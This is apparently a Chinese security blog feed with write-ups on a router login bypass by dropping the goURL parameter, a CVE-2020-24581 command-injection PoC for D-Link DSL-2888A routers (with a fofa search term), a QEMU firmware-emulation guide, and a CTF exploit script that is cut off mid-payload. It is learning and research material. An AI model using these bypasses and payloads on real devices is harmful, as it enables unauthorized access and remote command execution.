href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151842851.png" title="image-20230815184214754" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151842851.png" alt="image-20230815184214754"></a></p><p>会因为找不到文件而报错 </p><p>直接在对应目录下创建一个空文件就可以了</p><p>成功启动服务</p><h2 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2><p>首先我们要清楚 我们要从哪个方向来分析这个路由器  这一点是至关重要的 不能漫无目的</p><p>我们选择针对登录这一点来分析 首先试着随便输入密码 并且通过抓包来查看登录检测涉及到了哪些文件</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848154.png" title="image-20230815184817104" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848154.png" alt="image-20230815184817104"></a></p><p>可以看到 密码的发送是通过这个包来进行的</p><p>同时你可以注意到状态是302 这意味着服务器返回了重定向响应 来看一下跳转的地址是什么</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848830.png" title="image-20230815184849802" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848830.png" alt="image-20230815184849802"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.6.1/formLoginAuth.htm？authCode=0&amp;userName=&amp;goURL=phone/login.html&amp;action=login&amp;flag=1</span><br></pre></td></tr></table></figure><p>有着比较多的参数 应该是用来判断用户的密码是否正确 我们找到这个包对应的cgi文件</p><p>搜索username字符串 尝试找到对应的代码</p><p>发现了sub_42A2D0函数 其功能似乎是根据其他参数来决定重定向的网址 来看下面的代码</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151931810.png" title="image-20230815193100787" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151931810.png" alt="image-20230815193100787"></a></p><p>根据v9来判断重定向的网址 这里猜测应该是flag这个参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.6.1/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=phone/login.html&amp;action=login&amp;flag=ie8</span><br></pre></td></tr></table></figure><p>通过单独修改flag为ie8 最后成功重定向到了login_ie.html 证实了猜想 但是好像没有什么软用</p><p>接下来想的是为www目录下找到formLoginAuth.htm这个网址 但是好像没有 那么就去lighttpd这个文件来看看</p><p>可以看到 根据不同的网址来进入不同的函数 我们来跟进到form_login函数中</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151935557.png" title="image-20230815193537526" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151935557.png" alt="image-20230815193537526"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    fbss = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = time(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !ws_get_cookie(a1, <span class="string">&quot;SESSION_ID&quot;</span>, v16, <span class="number">0</span>) &amp;&amp; form_get_idx_by_sessionid(&amp;fl_sess, v13, v16) != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s/%s?timestamp=%ld&quot;</span>, v23, v20, v13);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sprintf</span>(v15, <span class="string">&quot;%ld:%d&quot;</span>, v13, <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v19, <span class="string">&quot;%d:%s&quot;</span>, <span class="number">2</span>, v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( form_get_idx_by_sessionid(&amp;fl_sess, v13, v19) != <span class="number">-1</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      v6 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( form_add_session(&amp;fl_sess, &amp;fl_sess_bak, <span class="number">-1</span>, v17, v6, v19, <span class="number">2</span>, v13) )</span><br><span class="line">    &#123;</span><br><span class="line">      ws_set_cookie(a3, <span class="string">&quot;SESSION_ID&quot;</span>, v19, <span class="number">0</span>, <span class="string">&quot;/&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s/%s?timestamp=%ld&quot;</span>, v23, v20, v13);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ws_clear_cookie(a3, <span class="string">&quot;SESSION_ID&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    fbss = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v14, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v23, <span class="string">&quot;/login_ie.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( atoi(&amp;v14) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s%s&quot;</span>, v23, <span class="string">&quot;/phone&quot;</span>, <span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v23, <span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到对于v8的值进行了判断 如果不为0则进入if分支 可以看到对于a2进行了操作 </p><p>而我们看到下面 a2应该是重定向的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151948757.png" title="image-20230815194828730" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151948757.png" alt="image-20230815194828730"></a></p><p>那么v8的值怎么来的呢  可以看到应该是跟authcode的参数有关系 那么我们将authcode修改为1后试试</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151949150.png" title="image-20230815194901122" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151949150.png" alt="image-20230815194901122"></a></p><p>结果发现还是跳转回到login.html页面  但是参数确实多了个timestamp</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151950240.png" title="image-20230815195043221" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151950240.png" alt="image-20230815195043221"></a></p><p>这里应该是由于我们重定向导致的 但是将flag删除掉 也没有办法 因为会进入最后的else分支 默认重定向到&#x2F;login.html</p><p>但是我们仔细观察一下参数 还是有一个叫做goURL的 我们把这个参数删除掉后</p><p>成功绕过了登录 进入了后台</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151952062.png" title="image-20230815195258957" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151952062.png" alt="image-20230815195258957"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2020-24581</title>
    <link href="http://example.com/2023/08/09/CVE-2020-24581/"/>
    <id>http://example.com/2023/08/09/CVE-2020-24581/</id>
    <published>2023-08-09T11:51:32.000Z</published>
    <updated>2023-09-14T17:18:53.765Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参照资料<a href="https://www.anquanke.com/post/id/229323#h3-5">https://www.anquanke.com/post/id/229323#h3-5</a></p><p>比较简单的一个CVE 且不需要模拟路由器环境 适合第一次接触iot的萌新(就比如我</p><p>同时由于我的网络基础知识薄弱 有些地方也是网络上查资料的 可能存在错误</p><p><strong>漏洞路由器型号:D-Link DSL-2888A</strong></p><p><strong>漏洞编号: CVE-2020-24581</strong></p><p><strong>fofa搜索关键词: body&#x3D;DSL-2888A</strong></p><p><strong>漏洞影响版本:  AU_2.31_V1.1.47ae55之前的版本</strong></p><p><strong>固件下载: <a href="https://www.dlink.com.sg/dsl-2888a/">https://www.dlink.com.sg/dsl-2888a/</a></strong></p><h1 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h1><p>首先要清楚 漏洞产生的原因是因为execute_cmd.cgi文件存在任意的参数执行</p><p>为了捋清楚漏洞的本质 我们要定位到以下两个重点</p><p><strong>1.如何执行到execute_cmd.cgi文件</strong></p><p><strong>2.如何赋值execute_cmd.cgi的参数</strong></p><h2 id="如何执行到execute-cmd-cgi文件"><a href="#如何执行到execute-cmd-cgi文件" class="headerlink" title="如何执行到execute_cmd.cgi文件"></a>如何执行到execute_cmd.cgi文件</h2><p>&#x2F;etc&#x2F;rc.d&#x2F;rcS是Linux系统中负责系统初始化以及启动相关任务的脚本</p><p>本次漏洞是由web服务触发的 所以我们需要跟进到路由器负责web服务的二进制文件 通过&#x2F;etc&#x2F;rc.d&#x2F;rcS脚本 可以定位到是dhttpd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ -e &quot;/usr/sbin/onetouch&quot; ]; then</span><br><span class="line">dxml -n dbros -t &amp;</span><br><span class="line">sleep 1</span><br><span class="line">dxmlc -l /usr/script/onetouch/dlink.xml</span><br><span class="line">sleep 1</span><br><span class="line">/usr/script/onetouch/sync_device.sh</span><br><span class="line">/usr/script/onetouch/sync_wan.sh</span><br><span class="line">/usr/script/onetouch/sync_wlan.sh</span><br><span class="line">/usr/script/onetouch/sync_wlan5g.sh</span><br><span class="line"></span><br><span class="line">dhttpd &amp;</span><br><span class="line">killall onetouch</span><br><span class="line">onetouch &amp;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>通过find命令 可以定位到位于&#x2F;usr&#x2F;sbin&#x2F;dhttpd目录<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092019177.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092019177.png" alt="image.png"></a><br>发现是32位的ARM架构的文件<br>随后我们需要定位到dhttp文件中负责调用execute_cmd.cgi文件的函数<br>先来搞明白cgi文件是什么 CGI (Common Gateway Interface) 文件是一种通用的网页编程技术 用于在Web服务器上执行可执行程序或脚本<br>其存放在jffs2-root&#x2F;www&#x2F;cgi-bin&#x2F;目录下<br>所以我们尝试在ida中搜索cgi-bin字符串 就可以跟着定位到sub_9C4C函数<br>该函数用来加载web和cgi组件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092106592.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092106592.png" alt="image.png"></a><br>我们可以进一步跟进到sub_BEA0函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092101331.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092101331.png" alt="image.png"></a><br>这里进行调用cgi文件前的相关check和初始化<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092102855.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092102855.png" alt="image.png"></a><br>在后面可以看到 需要相关的环境变量来启动cgi文件<br>可以看到有REMOTE_USER的变量 说明可能需要<br>随后调用了sub_BB5C函数执行cgi文件</p><h2 id="如何赋值execute-cmd-cgi的参数"><a href="#如何赋值execute-cmd-cgi的参数" class="headerlink" title="如何赋值execute_cmd.cgi的参数"></a>如何赋值execute_cmd.cgi的参数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">. /usr/syscfg/api_log.sh</span><br><span class="line">cmd=`echo $&#123;QUERY_STRING&#125; | cut -d = -f 3` </span><br><span class="line">cmd=`echo $&#123;cmd&#125; |tr &quot;%20&quot; &quot; &quot;` </span><br><span class="line">result=`$&#123;cmd&#125;`  </span><br><span class="line">TGP_Log $&#123;TGP_LOG_WARNING&#125; &quot;cmd=$&#123;cmd&#125;, result=$&#123;result&#125;&quot;</span><br><span class="line">echo  &quot;Content-type: text/html&quot;</span><br><span class="line">echo  &quot;&quot;</span><br><span class="line">echo -n $&#123;result&#125;</span><br></pre></td></tr></table></figure><p>通过分析其内容 可以看到cmd参数是根据QUERY_STRING环境变量的第三个字段来的 其分割符是‘&#x3D;’<br>那么我们此时来遍历一下目录下的所有文件 看看QUERY_STRING环境变量的内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_files</span>(<span class="params">directory, target_string</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            filepath = os.path.join(root, file)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                line_number = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">if</span> target_string.lower() <span class="keyword">in</span> line.lower():</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Found in file: <span class="subst">&#123;filepath&#125;</span>, line: <span class="subst">&#123;line_number&#125;</span>, content: <span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">                    line_number += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要搜索的目录和目标字符串</span></span><br><span class="line">search_directory = <span class="string">&#x27;/home/chen/iot/_DSL-2888A_AU_2.12_V1.1.47Z1-Image-all.bin.extracted/jffs2-root&#x27;</span></span><br><span class="line">target_string = <span class="string">&#x27;QUERYSTRING&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行批量搜索</span></span><br><span class="line">search_files(search_directory, target_string)</span><br></pre></td></tr></table></figure><p>这里搜索QUERY_STRING没有找到有用的文件 所以去掉了_</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092144787.png" title="image-20230809214437721" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092144787.png" alt="image-20230809214437721"></a></p><p>于是我们可以定位到ajax.js文件</p><p>通过观察POC我们可以知道 是通过GET请求 很快可以定位到对应的代码</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">get <span class="punctuation">:</span> function(_dataType)</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        var _url = this.url;</span><br><span class="line">        if(_url.indexOf(&#x27;?&#x27;) == <span class="number">-1</span>)</span><br><span class="line">            _url += &#x27;?timestamp=&#x27; + new Date().getTime();</span><br><span class="line">        else</span><br><span class="line">            _url += <span class="string">&quot;&amp;timestamp=&quot;</span> + new Date().getTime();</span><br><span class="line">        if(this.queryString.length &gt; <span class="number">0</span>)</span><br><span class="line">            _url += <span class="string">&quot;&amp;&quot;</span> + this.queryString;</span><br><span class="line"></span><br><span class="line">        this.xmlHttp.open(<span class="string">&quot;GET&quot;</span><span class="punctuation">,</span> _url<span class="punctuation">,</span> <span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">        <span class="comment">/* will make IE11 fail.</span></span><br><span class="line"><span class="comment">        if(!document.all)&#123;</span></span><br><span class="line"><span class="comment">            if(_dataType == &quot;xml&quot;)</span></span><br><span class="line"><span class="comment">                this.xmlHttp.overrideMimeType(&quot;text/xml;charset=utf8&quot;);</span></span><br><span class="line"><span class="comment">            else</span></span><br><span class="line"><span class="comment">                this.xmlHttp.overrideMimeType(&quot;text/html;charset=gb2312&quot;);//设定以gb2312编码识别数据  </span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        this.xmlHttp.send(<span class="literal"><span class="keyword">null</span></span>);</span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>不难看出其会在url后加上一个参数timestamp 用来记录当前的时间戳 随后拼接完url后发送</p><p>我个人认为这一步分析其实没有什么必要 因为在审计完execute_cmd.cgi后我们就可以得到POC如何编写了</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>加上刚才分析的 cmd参数是由第三个字段来的 也就是第二个参数 那么可以直接得到POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx/cgi-bin/execute_cmd.cgi?aaaa=6&amp;bbbb=ls</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092154559.png" title="image-20230809215418504" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092154559.png" alt="image-20230809215418504"></a></p><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>在dhttpd文件的分析中 可以看到要成功执行cgi文件还需要先进行登录验证</p><p>所以我们需要搭配上CVE-2020-24579才能成功复现该漏洞</p><p>这里就不进行讲解</p><p><a href="https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/">https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>qemu搭建路由器虚拟环境</title>
    <link href="http://example.com/2023/08/09/qemu%E6%90%AD%E5%BB%BA%E8%B7%AF%E7%94%B1%E5%99%A8%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
    <id>http://example.com/2023/08/09/qemu%E6%90%AD%E5%BB%BA%E8%B7%AF%E7%94%B1%E5%99%A8%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</id>
    <published>2023-08-09T00:01:57.000Z</published>
    <updated>2023-09-14T17:21:05.389Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在经历了一年的glibc学习 终于也是开始接触到了真正的二进制 怀着激动的心情 开始Iot的旅途！<br>本文用来收录不属于cve复现中的虚拟环境搭建过程</p><h1 id="华为532e"><a href="#华为532e" class="headerlink" title="华为532e"></a>华为532e</h1><p>本次使用的固件是华为532e系列路由器<br>固件下载地址： <a href="https://github.com/CcccccccJun/cloud">https://github.com/CcccccccJun/cloud</a></p><p>首先使用binwalk来提取固件 这里要注意一下 如果binwalk没有提取到root文件夹 那么问题出在没有安装相应的文件系统<br>该固件需要安装的是sasquatch 配置好相关环境后可以成功提取到文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090859342.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090859342.png" alt="image.png"></a><br>随后我们将root目录打包成压缩文件 供等下上传到模拟系统中<br><code>tar -czvf 1.tar squashfs-root/</code><br>qemu模拟有多种形式 本次我们使用的是系统模拟 同时通过file观察任意的可执行文件 可以注意到该路由器使用的是MIPS架构<br>为此 我们需要准备MIPS的内核文件以及一个MIPS架构的虚拟机映像文件<br>可以在该网站上下载  <a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a><br>随后我们需要创建一个TUN&#x2F;TAP虚拟网络接口 其可以在操作系统和用户空间之间进行网络数据包的传输 便于我们在虚拟机中连接到启动后的路由器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tunctl -t top0 -u root</span><br><span class="line">ifconfig top0 192.168.10.1</span><br></pre></td></tr></table></figure><p>我们给予的top0接口的ipv4地址的子网号可以为任意 同时要使用默认网关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090936146.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090936146.png" alt="image.png"></a><br>随后我们利用qemu进行系统模拟<br><code>qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</code><br>为qemu模拟出来的虚拟机增加了一个TAP设备的虚拟网络接口top0用于通信<br>默认的登录账号和密码都是root<br>我们将eth0接口配置和刚才top0接口相同的c段<br><code>ifconfig eth0 192.169.10.2</code><br>随后就可以在ubuntu中访问到debian虚拟机<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090958896.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090958896.png" alt="image.png"></a><br>随后我们利用scp把刚才打包好的压缩文件上传到debian虚拟机中<br><code>scp 1.tar root@192.168.10.2:/root/</code><br>但是这里报错了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091008147.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091008147.png" alt="image.png"></a><br>大概意思是debian虚拟机中的openssh禁用了ssh-dss算法<br>我们需要手动加上参数来允许</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -oHostKeyAlgorithms=+ssh-dss 1.tar root@192.168.10.2:/root/</span><br></pre></td></tr></table></figure><p>随后回到debian虚拟机 利用<code>tar –zxvf 1.tar</code> 命令进行解压<br>接着我们需要将&#x2F;dev目录与squashfs-root目录进行绑定 使得可以访问到所需的设备文件<br>同理 将&#x2F;proc目录挂载到squashfs-root对应的目录下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">mount -t proc /proc ./squashfs-root/proc/</span><br></pre></td></tr></table></figure><p>随后以squashfs-root目录为根目录 执行shell<br><code>chroot ./squashfs-root/ sh</code><br>由于在路由器启动后 eth0接口的ip地址会被更改 所以我们需要在启动路由器的过程中 重新配置eth0接口 这也就意味着我们需要连接两个会话<br>已有的会话是通过qemu模拟后直接生成的虚拟机 不会随着ip的更改而断开 而通过ssh连接的会话会因为ip受到影响<br>于是 我们需要在ssh的会话中启动路由器 随后这个ssh进程就会因为ip改变而卡住 然后我们再通过原本的会话重新配置eth0 就可以成功启动路由器的同时 保证我们的eth0还是原本的ip地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure><p>启动路由器的环境</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091028108.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091028108.png" alt="image.png"></a><br>成功启动后 我们就可以在宿主机中访问到路由器了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091029879.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091029879.png" alt="image.png"></a><br>这里使用360浏览器是因为其他浏览器不支持TLS1.0的协议 导致无法成功访问</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>NssCTF round14</title>
    <link href="http://example.com/2023/07/30/NssCTF-round14/"/>
    <id>http://example.com/2023/07/30/NssCTF-round14/</id>
    <published>2023-07-30T08:31:02.000Z</published>
    <updated>2023-09-14T17:21:09.033Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><p>这题可以非预期 但是由于时间比较充裕 就按照出题人的意思来做一做</p><p>比较简单的一题 难点在于最后的破坏了tls结构体的时候 不能选择system函数 要用syscall 但是稍微修复一下tls结构体 还是可以调用system函数的</p><p>考点在于pthread_create会使得新线程栈的布局迁移到tls结构体附近的一块地址 导致我们可以通过栈溢出覆盖到tls的canary 从而来绕过canary</p><p>修复tls结构体只需要把fs:0x10处的值覆盖成addr+0x308后是一个可读的地址即可</p><p>自己调一调就可以懂了</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.anna.nssctf.cn&quot;</span>,<span class="number">28092</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;I want to hear your praise of Toka&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%520c%9$n%17$p&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x40131B&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401290&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;\xc0&quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fs_base = libc_addr - <span class="number">0x3900</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rdi_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">ret_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;ret&quot;</span>)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;I know you like him, but you must pass my level&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(<span class="number">0x100</span>)+cyclic(<span class="number">0x8</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+cyclic(<span 